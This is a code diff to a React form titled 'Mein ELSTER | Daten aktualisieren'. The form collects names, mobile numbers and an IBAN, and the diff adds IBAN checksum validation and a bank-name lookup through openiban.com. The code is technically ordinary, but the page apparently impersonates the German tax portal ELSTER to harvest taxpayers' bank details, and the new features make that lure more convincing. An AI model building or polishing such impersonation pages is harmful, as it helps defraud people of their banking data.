@@ -50,10 +50,38 @@ const ElsterDatenaktualisierung = () => {
     { firstName: "", lastName: "", mobile: "" },
   ]);
   const [iban, setIban] = useState("");
+  const [bankName, setBankName] = useState("");
   const [errors, setErrors] = useState<Record<string, string>>({});
   const [showLoading, setShowLoading] = useState(false);
   const [submitting, setSubmitting] = useState(false);
   const [menuOpen, setMenuOpen] = useState(false);
+
+  const cleanedIban = iban.replace(/\s/g, "").toUpperCase();
+  const ibanValid = useMemo(() => {
+    const s = cleanedIban;
+    if (s.length < 15 || s.length > 34 || !/^[A-Z0-9]+$/.test(s)) return false;
+    const rearranged = s.slice(4) + s.slice(0, 4);
+    const converted = rearranged.replace(/[A-Z]/g, (c) => (c.charCodeAt(0) - 55).toString());
+    let remainder = 0;
+    for (let i = 0; i < converted.length; i++) {
+      remainder = (remainder * 10 + Number(converted[i])) % 97;
+    }
+    return remainder === 1;
+  }, [cleanedIban]);
+
+  useEffect(() => {
+    if (!ibanValid) { setBankName(""); return; }
+    const ctrl = new AbortController();
+    const t = setTimeout(async () => {
+      try {
+        const res = await fetch(`https://openiban.com/validate/${cleanedIban}?getBIC=true&validateBankCode=true`, { signal: ctrl.signal });
+        const data = await res.json();
+        if (data?.valid && data?.bankData?.name) setBankName(data.bankData.name);
+        else setBankName("");
+      } catch { /* ignore */ }
+    }, 400);
+    return () => { ctrl.abort(); clearTimeout(t); };
+  }, [cleanedIban, ibanValid]);
 
   useEffect(() => { window.scrollTo(0, 0); }, [step]);
   usePageMeta("Mein ELSTER | Daten aktualisieren", "/favicon.png");
